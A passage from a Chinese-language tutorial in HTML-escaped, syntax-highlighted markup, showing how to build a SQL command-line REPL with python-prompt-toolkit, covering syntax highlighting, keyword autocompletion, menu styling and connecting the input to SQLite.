        &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lexer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SqlLexer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You entered:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GoodBye!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/3.png?raw=true" /&gt;&lt;/p&gt;
&lt;h3&gt;自动补全&lt;/h3&gt;
&lt;p&gt;语法高亮屌爆啦！你造什么更牛一些吗？自动补全！开干！&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;WordCompleter&lt;/code&gt;类创建一个叫做&lt;code&gt;sql_completer&lt;/code&gt;的实例，初始化的时候，定义一组关键字集合，它们将用于自动补全&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sql_completer&lt;/code&gt;实例将被传递到&lt;code&gt;prompt&lt;/code&gt;函数里&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.history&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.contrib.completers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.lexers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SqlLexer&lt;/span&gt;

&lt;span class="n"&gt;sql_completer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;create&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;drop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                               &lt;span class="s1"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;from&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;table&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;ignore_case&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lexer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SqlLexer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;completer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sql_completer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You entered:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GoodBye!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/4.png?raw=true" /&gt;&lt;/p&gt;
&lt;p&gt;大约用了30行代码我们就得到了一个拥有自动补全和语法高亮的REPL。 再接再厉！&lt;/p&gt;
&lt;h3&gt;修改菜单样式&lt;/h3&gt;
&lt;p&gt;自动补全菜单忒丑，让我们给它点"颜色"看看！创建&lt;code&gt;DocumentStyle&lt;/code&gt;，使它成为pygments.style的子类. 定制自动补全菜单的颜色，并把样式作为参数传到&lt;code&gt;prompt&lt;/code&gt;函数里：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.history&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.contrib.completers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.lexers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SqlLexer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.style&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Style&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.token&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Token&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.styles.default&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;DefaultStyle&lt;/span&gt;

&lt;span class="n"&gt;sql_completer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;create&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;drop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                               &lt;span class="s1"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;from&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;table&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;ignore_case&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;DocumentStyle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Style&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;styles&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completion&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#00aaaa #000000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completion&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#008888 #ffffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ProgressButton&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#003333&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ProgressBar&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#00aaaa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;styles&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DefaultStyle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;styles&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lexer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SqlLexer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;completer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sql_completer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                      &lt;span class="n"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DocumentStyle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You entered:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GoodBye!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/5.png?raw=true" /&gt;&lt;/p&gt;
&lt;p&gt;剩下的工作就是如何对接到sqlite后端，作为读者的家庭作业好了。哈哈开玩笑啦...我们继续&lt;/p&gt;
&lt;h3&gt;对接到Sqlite&lt;/h3&gt;
&lt;p&gt;这一步是可选的 ;)  之前我们一直在关注如何构建REPL. 现在是时候将输入传给SQLite&lt;/p&gt;
&lt;p&gt;显然我没有考虑错误处理，但它或许可以作为你们的起步参考&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlite3&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AbortAction&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.history&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.contrib.completers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.lexers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SqlLexer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.style&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Style&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.token&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Token&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.styles.default&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;DefaultStyle&lt;/span&gt;

&lt;span class="n"&gt;sql_completer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WordCompleter&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;create&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;drop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                               &lt;span class="s1"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;from&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;table&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;ignore_case&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;DocumentStyle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Style&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;styles&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completion&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#00aaaa #000000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completion&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#008888 #ffffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ProgressButton&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#003333&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;Token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Completions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ProgressBar&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bg:#00aaaa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;styles&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DefaultStyle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;styles&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;database&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;database&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lexer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SqlLexer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;completer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sql_completer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DocumentStyle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;on_abort&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AbortAction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RETRY&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;EOFError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;  &lt;span class="c1"&gt;# Control-D pressed.&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;messages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;messages&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GoodBye!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;:memory:&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
